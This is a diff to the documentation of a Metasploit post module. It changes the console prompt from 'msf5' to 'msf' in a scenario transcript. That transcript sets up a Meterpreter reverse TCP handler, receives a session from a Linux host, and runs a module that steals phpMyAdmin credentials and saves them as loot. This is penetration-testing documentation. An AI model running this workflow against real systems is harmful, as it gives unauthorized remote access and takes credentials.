@@ -15,12 +15,12 @@ This post module gathers PhpMyAdmin Creds from target Linux machine.
 ## Scenarios
 
 ```
-msf5 > use multi/handler
-msf5 exploit(multi/handler) > set lhost 192.168.37.1
+msf > use multi/handler
+msf exploit(multi/handler) > set lhost 192.168.37.1
 lhost => 192.168.37.1
-msf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
 payload => linux/x64/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) > run
+msf exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 192.168.37.1:4444 
 [*] Sending stage (816260 bytes) to 192.168.37.226
@@ -28,10 +28,10 @@ msf5 exploit(multi/handler) > run
 
 meterpreter > background
 [*] Backgrounding session 2...
-msf5 exploit(multi/handler) > use post/linux/gather/phpmyadmin_credsteal 
-msf5 post(linux/gather/phpmyadmin_credsteal) > set session 2
+msf exploit(multi/handler) > use post/linux/gather/phpmyadmin_credsteal 
+msf post(linux/gather/phpmyadmin_credsteal) > set session 2
 session => 2
-msf5 post(linux/gather/phpmyadmin_credsteal) > run
+msf post(linux/gather/phpmyadmin_credsteal) > run
 
 
 PhpMyAdmin Creds Stealer!
@@ -43,6 +43,6 @@ PhpMyAdmin Creds Stealer!
 [*] Storing credentials...
 [+] Config file located at /Users/space/.msf4/loot/20180907081056_default_192.168.37.226_phpmyadmin_conf_580315.txt
 [*] Post module execution completed
-msf5 post(linux/gather/phpmyadmin_credsteal) > 
+msf post(linux/gather/phpmyadmin_credsteal) > 
 
 ```
